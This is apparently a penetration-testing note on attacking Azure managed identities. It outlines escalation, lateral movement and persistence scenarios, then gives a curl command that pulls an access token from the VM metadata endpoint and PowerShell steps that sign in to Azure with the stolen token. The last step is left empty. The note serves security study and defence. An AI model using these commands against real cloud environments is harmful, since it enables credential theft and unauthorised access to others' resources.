# Managed Identities

## Exploitation Scenarios

### 1. Privilege Escalation via Over-Permissioned Managed Identities
If a managed identity is assigned overly permissive roles (e.g., Contributor, Owner, or Key Vault Administrator), an attacker who gains access to that identity (e.g., via a compromised VM or App Service) can perform high-privilege actions:

Access secrets in Azure Key Vault

Modify or delete Azure resources

Deploy new infrastructure

### 2. Lateral Movement Between Resources

Once an attacker compromises a resource (such as a VM or container), they can use the managed identity token from the Instance Metadata Service (IMDS) to:

Access other Azure services (e.g., storage, databases, Key Vaults)

Move to other services where the identity has access, facilitating further exploitation

### 3. Token Theft via the IMDS (Instance Metadata Service) Endpoint

Azure VMs and other compute resources expose the IMDS endpoint at http://169.254.169.254/. If an attacker gains access to the machine (even via limited command execution), they can:

Query IMDS to obtain an access token for the managed identity

Use this token to access any Azure resource the identity is authorized for

### 4. Persistence Through Managed Identity Abuse

If an attacker compromises a resource and that resource's managed identity has write access to automation accounts, Logic Apps, or Functions, they could:

Create persistent scripts or backdoors

Establish scheduled tasks that keep calling external C2 (command and control) servers
  
### 5. Misuse of User-Assigned Managed Identities (UAMI)

User-assigned MIs can be attached/detached from different resources. If an attacker finds a UAMI with high privileges:

They could attach it to a compromised resource (like a VM they control)

Use the new token to escalate privileges or exfiltrate data

## Steps

### 1) Get an Azure access token from a VM

    curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
      -H "Metadata: true"


### 2) Run PowerShell

    powershell

### 3) Use the Azure Module to connect to Azure

    PS> Install-Module -Name Az -Repository PSGallery -Force
    PS> Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>

### 4) Retrieve information about Azure resources in our subscription

    Get-AzResource

### 5) 
